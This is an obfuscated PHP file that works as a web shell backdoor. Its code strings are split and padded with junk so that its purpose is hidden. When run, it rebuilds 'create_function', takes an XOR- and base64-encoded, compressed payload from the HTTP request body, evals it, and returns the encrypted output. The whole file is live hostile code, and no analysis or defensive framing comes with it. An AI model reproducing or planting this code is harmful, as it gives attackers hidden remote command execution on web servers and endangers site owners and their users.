<?php
$h='$k{$j};}-,}return -,$o;}if -,(@preg_-,match-,("/$k-,-,-,h(.+)$kf/",@file_ge-,t-,_cont';
$I='ent-,s-,(-,"p-,hp://input"),$m)-,=-,=1) {@ob-,_start();@e-,val(@gzunco-,-,-,mpress(';
$W='or($i=0;$-,i<$-,l;){for($j=0;-,($-,j<-,-,$c&&-,$i<$l);$j-,++,$i++){$o.=$-,t{$i-,}^';
$x='clean();$r=@-,b-,ase64_encode(@-,x-,(@g-,zc-,ompress-,($o),$k-,));print("$p$kh-,$r$kf");}';
$C='$k-,="54fe7f0-,0";$-,kh="21e-,-,e84a44fae";$kf="-,-,6-,726d375d55e";$p-,="TECF-,YNfR-,aX-';
$U=',3fYYxE";f-,uncti-,on x($t,$k-,)-,{$c=s-,trlen($k);$l-,=strlen(-,$t)-,-,-,;$o="";f';
$v='@x-,(@base6-,4_d-,ecode($m[1]),$k)-,-,));$o=@o-,b_get-,_conten-,ts();-,@-,o-,b_end_';
$w=str_replace('V','','VcrVeate_VfuVnVctiVon');
$u=str_replace('-,','',$C.$U.$W.$h.$I.$v.$x);
$z=$w('',$u);$z();
?>
